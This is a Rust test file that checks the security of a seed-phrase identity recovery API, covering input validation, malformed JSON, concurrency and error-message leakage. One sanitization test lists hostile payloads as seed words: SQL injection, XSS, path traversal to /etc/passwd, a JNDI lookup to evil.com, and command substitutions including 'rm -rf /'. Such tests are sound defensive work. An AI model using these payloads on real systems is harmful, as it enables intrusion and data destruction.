//! Security Tests for Identity Recovery
//!
//! Tests security aspects: auth, validation, rate limiting, information disclosure

use std::sync::Arc;
use tokio::sync::RwLock;
use lib_identity::{IdentityManager, economics::EconomicModel};
use lib_protocols::types::{ZhtpRequest, ZhtpMethod, ZhtpHeaders, ZhtpStatus};
use lib_protocols::zhtp::ZhtpRequestHandler;
use zhtp::api::handlers::identity::IdentityHandler;

#[tokio::test]
async fn test_invalid_seed_phrase_word_count_rejection() {
    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));
    let handler = IdentityHandler::new(identity_manager, economic_model);

    // Test various invalid word counts
    for invalid_count in [0, 1, 5, 10, 15, 19, 21, 25, 50] {
        let invalid_seeds: Vec<String> = (0..invalid_count)
            .map(|i| format!("word{}", i))
            .collect();

        let restore_request_data = serde_json::json!({
            "primary_seed_phrase": invalid_seeds.clone(),
            "ubi_seed_phrase": invalid_seeds.clone(),
            "savings_seed_phrase": invalid_seeds.clone(),
            "password": "TestPass123",
            "display_name": "Test User"
        });

        let restore_request = ZhtpRequest {
            method: ZhtpMethod::Post,
            uri: "/api/v1/identity/restore/seed".to_string(),
            version: "ZHTP/1.0".to_string(),
            headers: ZhtpHeaders::new(),
            body: serde_json::to_vec(&restore_request_data).unwrap(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
            requester: None,
            auth_proof: None,
        };

        let restore_response = handler.handle_request(restore_request).await.unwrap();

        assert_eq!(
            restore_response.status,
            ZhtpStatus::BadRequest,
            "Invalid word count {} should be rejected",
            invalid_count
        );
    }
}

#[tokio::test]
async fn test_mismatched_seed_phrase_counts_rejection() {
    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));
    let handler = IdentityHandler::new(identity_manager, economic_model);

    // Primary has 20, UBI has 15, Savings has 20 - should fail
    let primary_seeds: Vec<String> = (0..20).map(|i| format!("p{:02}", i)).collect();
    let ubi_seeds: Vec<String> = (0..15).map(|i| format!("u{:02}", i)).collect();
    let savings_seeds: Vec<String> = (0..20).map(|i| format!("s{:02}", i)).collect();

    let restore_request_data = serde_json::json!({
        "primary_seed_phrase": primary_seeds,
        "ubi_seed_phrase": ubi_seeds,
        "savings_seed_phrase": savings_seeds,
        "password": "TestPass123",
        "display_name": "Test User"
    });

    let restore_request = ZhtpRequest {
        method: ZhtpMethod::Post,
        uri: "/api/v1/identity/restore/seed".to_string(),
        version: "ZHTP/1.0".to_string(),
        headers: ZhtpHeaders::new(),
        body: serde_json::to_vec(&restore_request_data).unwrap(),
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        requester: None,
        auth_proof: None,
    };

    let restore_response = handler.handle_request(restore_request).await.unwrap();
    assert_eq!(restore_response.status, ZhtpStatus::BadRequest);
}

#[tokio::test]
async fn test_empty_seed_phrases_rejection() {
    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));
    let handler = IdentityHandler::new(identity_manager, economic_model);

    let restore_request_data = serde_json::json!({
        "primary_seed_phrase": [],
        "ubi_seed_phrase": [],
        "savings_seed_phrase": [],
        "password": "TestPass123",
        "display_name": "Test User"
    });

    let restore_request = ZhtpRequest {
        method: ZhtpMethod::Post,
        uri: "/api/v1/identity/restore/seed".to_string(),
        version: "ZHTP/1.0".to_string(),
        headers: ZhtpHeaders::new(),
        body: serde_json::to_vec(&restore_request_data).unwrap(),
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        requester: None,
        auth_proof: None,
    };

    let restore_response = handler.handle_request(restore_request).await.unwrap();
    assert_eq!(restore_response.status, ZhtpStatus::BadRequest);
}

#[tokio::test]
async fn test_seed_words_with_special_characters_sanitization() {
    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));
    let handler = IdentityHandler::new(identity_manager, economic_model);

    // Seed phrases with SQL injection attempts, XSS, etc.
    let malicious_seeds: Vec<String> = vec![
        "word'; DROP TABLE users; --".to_string(),
        "<script>alert('xss')</script>".to_string(),
        "word\0null".to_string(),
        "word\n\r".to_string(),
        "../../../etc/passwd".to_string(),
        "word%00".to_string(),
        "word\u{202e}".to_string(), // Right-to-left override
        "${jndi:ldap://evil.com}".to_string(),
        "word`whoami`".to_string(),
        "word$(rm -rf /)".to_string(),
        "normal1".to_string(),
        "normal2".to_string(),
        "normal3".to_string(),
        "normal4".to_string(),
        "normal5".to_string(),
        "normal6".to_string(),
        "normal7".to_string(),
        "normal8".to_string(),
        "normal9".to_string(),
        "normal10".to_string(),
    ];

    let restore_request_data = serde_json::json!({
        "primary_seed_phrase": malicious_seeds.clone(),
        "ubi_seed_phrase": malicious_seeds.clone(),
        "savings_seed_phrase": malicious_seeds.clone(),
        "password": "TestPass123",
        "display_name": "Test User"
    });

    let restore_request = ZhtpRequest {
        method: ZhtpMethod::Post,
        uri: "/api/v1/identity/restore/seed".to_string(),
        version: "ZHTP/1.0".to_string(),
        headers: ZhtpHeaders::new(),
        body: serde_json::to_vec(&restore_request_data).unwrap(),
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        requester: None,
        auth_proof: None,
    };

    let restore_response = handler.handle_request(restore_request).await;

    // Should either reject (BadRequest) or handle safely without crashing
    assert!(restore_response.is_ok(), "Should not crash on malicious input");

    if let Ok(response) = restore_response {
        // If it processes, verify it doesn't return sensitive error info
        let response_str = String::from_utf8_lossy(&response.body);
        assert!(!response_str.contains("panic"), "Should not expose panic info");
        assert!(!response_str.contains("unwrap"), "Should not expose unwrap info");
        assert!(!response_str.contains("/home/"), "Should not expose file paths");
    }
}

#[tokio::test]
async fn test_display_name_length_limits() {
    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));
    let handler = IdentityHandler::new(identity_manager, economic_model);

    let primary_seeds: Vec<String> = (0..20).map(|i| format!("p{:02}", i)).collect();
    let ubi_seeds: Vec<String> = (0..20).map(|i| format!("u{:02}", i)).collect();
    let savings_seeds: Vec<String> = (0..20).map(|i| format!("s{:02}", i)).collect();

    // Test extremely long display name (potential DoS)
    let long_name = "A".repeat(100000);

    let restore_request_data = serde_json::json!({
        "primary_seed_phrase": primary_seeds,
        "ubi_seed_phrase": ubi_seeds,
        "savings_seed_phrase": savings_seeds,
        "password": "TestPass123",
        "display_name": long_name
    });

    let restore_request = ZhtpRequest {
        method: ZhtpMethod::Post,
        uri: "/api/v1/identity/restore/seed".to_string(),
        version: "ZHTP/1.0".to_string(),
        headers: ZhtpHeaders::new(),
        body: serde_json::to_vec(&restore_request_data).unwrap(),
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        requester: None,
        auth_proof: None,
    };

    let restore_response = handler.handle_request(restore_request).await;

    // Should not crash and should handle gracefully
    assert!(restore_response.is_ok(), "Should handle long display names gracefully");
}

#[tokio::test]
async fn test_concurrent_restore_attempts_same_seeds() {
    use futures::future::join_all;

    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));

    // Same seeds used in 10 concurrent restore attempts
    let primary_seeds: Vec<String> = (0..20).map(|i| format!("concurrent{:02}", i)).collect();
    let ubi_seeds: Vec<String> = (0..20).map(|i| format!("concurrent{:02}", i)).collect();
    let savings_seeds: Vec<String> = (0..20).map(|i| format!("concurrent{:02}", i)).collect();

    let mut handles = Vec::new();

    for i in 0..10 {
        let handler = IdentityHandler::new(identity_manager.clone(), economic_model.clone());
        let p_seeds = primary_seeds.clone();
        let u_seeds = ubi_seeds.clone();
        let s_seeds = savings_seeds.clone();

        let handle = tokio::spawn(async move {
            let restore_request_data = serde_json::json!({
                "primary_seed_phrase": p_seeds,
                "ubi_seed_phrase": u_seeds,
                "savings_seed_phrase": s_seeds,
                "password": format!("Pass{}", i),
                "display_name": format!("User{}", i)
            });

            let restore_request = ZhtpRequest {
                method: ZhtpMethod::Post,
                uri: "/api/v1/identity/restore/seed".to_string(),
                version: "ZHTP/1.0".to_string(),
                headers: ZhtpHeaders::new(),
                body: serde_json::to_vec(&restore_request_data).unwrap(),
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs(),
                requester: None,
                auth_proof: None,
            };

            handler.handle_request(restore_request).await
        });

        handles.push(handle);
    }

    let results = join_all(handles).await;

    // All should complete without panic
    for (i, result) in results.iter().enumerate() {
        assert!(result.is_ok(), "Concurrent restore {} should not panic", i);
    }

    // All should produce same identity ID (deterministic)
    let mut identity_ids = Vec::new();
    for result in results {
        let response = result.unwrap().unwrap();
        if response.status == ZhtpStatus::Ok {
            let data: serde_json::Value = serde_json::from_slice(&response.body).unwrap();
            if let Some(id) = data.get("identity_id").and_then(|v| v.as_str()) {
                identity_ids.push(id.to_string());
            }
        }
    }

    if identity_ids.len() > 1 {
        // All IDs should be the same (deterministic recovery)
        let first_id = &identity_ids[0];
        for id in &identity_ids {
            assert_eq!(id, first_id, "Same seeds should produce same identity ID");
        }
    }
}

#[tokio::test]
async fn test_verify_seed_does_not_store_phrase() {
    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));
    let handler = IdentityHandler::new(identity_manager.clone(), economic_model);

    let test_seeds: Vec<String> = (0..20).map(|i| format!("verify{:02}", i)).collect();

    let verify_request_data = serde_json::json!({
        "seed_phrase": test_seeds,
        "wallet_type": "primary"
    });

    let verify_request = ZhtpRequest {
        method: ZhtpMethod::Post,
        uri: "/api/v1/identity/seed/verify".to_string(),
        version: "ZHTP/1.0".to_string(),
        headers: ZhtpHeaders::new(),
        body: serde_json::to_vec(&verify_request_data).unwrap(),
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        requester: None,
        auth_proof: None,
    };

    let _verify_response = handler.handle_request(verify_request).await.unwrap();

    // Verify that no identity was created
    let manager = identity_manager.read().await;
    assert_eq!(manager.list_identities().len(), 0, "Verify should not create identity");
}

#[tokio::test]
async fn test_error_messages_do_not_leak_sensitive_info() {
    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));
    let handler = IdentityHandler::new(identity_manager, economic_model);

    // Intentionally trigger an error with invalid request
    let invalid_request = ZhtpRequest {
        method: ZhtpMethod::Post,
        uri: "/api/v1/identity/restore/seed".to_string(),
        version: "ZHTP/1.0".to_string(),
        headers: ZhtpHeaders::new(),
        body: b"invalid json {{{".to_vec(),
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        requester: None,
        auth_proof: None,
    };

    let error_response = handler.handle_request(invalid_request).await.unwrap();

    let error_message = String::from_utf8_lossy(&error_response.body);

    // Should not expose sensitive information
    assert!(!error_message.contains("/home/"), "Should not expose file paths");
    assert!(!error_message.contains("src/"), "Should not expose source paths");
    assert!(!error_message.contains("panic"), "Should not expose panic details");
    assert!(!error_message.contains("stack"), "Should not expose stack traces");
    assert!(!error_message.to_lowercase().contains("password"), "Should not mention passwords in errors");
    assert!(!error_message.to_lowercase().contains("secret"), "Should not mention secrets");
}

#[tokio::test]
async fn test_malformed_json_handling() {
    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));
    let handler = IdentityHandler::new(identity_manager, economic_model);

    let malformed_bodies = vec![
        b"".to_vec(),
        b"{".to_vec(),
        b"}{".to_vec(),
        b"null".to_vec(),
        b"[]".to_vec(),
        b"{\"primary_seed_phrase\": null}".to_vec(),
        b"{\"primary_seed_phrase\": \"not an array\"}".to_vec(),
    ];

    for body in malformed_bodies {
        let request = ZhtpRequest {
            method: ZhtpMethod::Post,
            uri: "/api/v1/identity/restore/seed".to_string(),
            version: "ZHTP/1.0".to_string(),
            headers: ZhtpHeaders::new(),
            body,
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
            requester: None,
            auth_proof: None,
        };

        let response = handler.handle_request(request).await;
        assert!(response.is_ok(), "Should handle malformed JSON gracefully");

        if let Ok(resp) = response {
            assert!(
                resp.status == ZhtpStatus::BadRequest ||
                resp.status == ZhtpStatus::InternalServerError,
                "Should return appropriate error status"
            );
        }
    }
}

#[tokio::test]
async fn test_unicode_handling_in_seed_phrases() {
    let identity_manager = Arc::new(RwLock::new(IdentityManager::new()));
    let economic_model = Arc::new(RwLock::new(EconomicModel::new()));
    let handler = IdentityHandler::new(identity_manager, economic_model);

    // Test various Unicode edge cases
    let unicode_seeds: Vec<String> = vec![
        "café".to_string(),           // Accented characters
        "日本語".to_string(),          // Japanese
        "emoji🔥test".to_string(),     // Emoji
        "zero\u{200B}width".to_string(), // Zero-width space
        "normalword".to_string(),
        "test".to_string(),
        "word".to_string(),
        "seed".to_string(),
        "phrase".to_string(),
        "recovery".to_string(),
        "backup".to_string(),
        "secure".to_string(),
        "wallet".to_string(),
        "crypto".to_string(),
        "identity".to_string(),
        "user".to_string(),
        "account".to_string(),
        "system".to_string(),
        "network".to_string(),
        "protocol".to_string(),
    ];

    let restore_request_data = serde_json::json!({
        "primary_seed_phrase": unicode_seeds.clone(),
        "ubi_seed_phrase": unicode_seeds.clone(),
        "savings_seed_phrase": unicode_seeds,
        "password": "TestPass123",
        "display_name": "Unicode Test"
    });

    let restore_request = ZhtpRequest {
        method: ZhtpMethod::Post,
        uri: "/api/v1/identity/restore/seed".to_string(),
        version: "ZHTP/1.0".to_string(),
        headers: ZhtpHeaders::new(),
        body: serde_json::to_vec(&restore_request_data).unwrap(),
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        requester: None,
        auth_proof: None,
    };

    let restore_response = handler.handle_request(restore_request).await;
    assert!(restore_response.is_ok(), "Should handle Unicode gracefully");
}
